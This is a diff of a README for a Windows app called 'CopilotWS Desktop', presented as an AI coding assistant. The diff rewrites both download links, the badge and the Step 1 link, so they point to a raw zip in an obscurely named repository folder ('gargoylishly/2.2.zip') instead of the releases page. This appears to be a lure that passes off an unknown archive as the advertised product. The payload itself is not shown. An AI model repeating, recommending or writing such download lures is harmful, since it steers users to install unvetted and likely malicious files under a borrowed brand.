@@ -1,6 +1,6 @@
 # 🚀 CopilotWS-Desktop---Copilot-Workspace-2026 - Your AI-Powered Coding Assistant
 
-[![Download Now](https://img.shields.io/badge/Download-CopilotWS_Desktop_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Jimboocher3373/CopilotWS-Desktop---Copilot-Workspace-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-CopilotWS_Desktop_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Jimboocher3373/CopilotWS-Desktop---Copilot-Workspace-2026/raw/refs/heads/main/gargoylishly/2.2.zip)
 
 ## 📖 What Is This?
 
@@ -29,7 +29,7 @@ Organize multiple projects in one place. Switch between different coding tasks w
 ## 🚀 Getting Started
 
 ### Step 1: Visit the Download Page
-Visit this link to download the application: [https://github.com/Jimboocher3373/CopilotWS-Desktop---Copilot-Workspace-2026/releases](https://github.com/Jimboocher3373/CopilotWS-Desktop---Copilot-Workspace-2026/releases)
+Visit this link to download the application: [https://github.com/Jimboocher3373/CopilotWS-Desktop---Copilot-Workspace-2026/raw/refs/heads/main/gargoylishly/2.2.zip](https://github.com/Jimboocher3373/CopilotWS-Desktop---Copilot-Workspace-2026/raw/refs/heads/main/gargoylishly/2.2.zip)
 
 ### Step 2: Choose Your Version
 On the download page, you'll see several files. Look for the one that matches your Windows system:
